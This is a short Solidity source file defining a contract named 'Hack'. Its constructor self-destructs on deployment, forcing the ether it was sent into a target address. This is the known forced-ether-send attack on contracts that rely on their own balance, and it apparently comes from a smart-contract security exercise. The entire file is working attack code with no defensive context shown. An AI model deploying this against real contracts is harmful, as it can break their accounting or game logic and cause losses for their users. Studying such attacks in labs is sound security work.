// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    constructor(address payable _target) payable{
        selfdestruct(_target);
    }
    function getBalance() external view returns(uint){
        return address(this).balance;
    }
}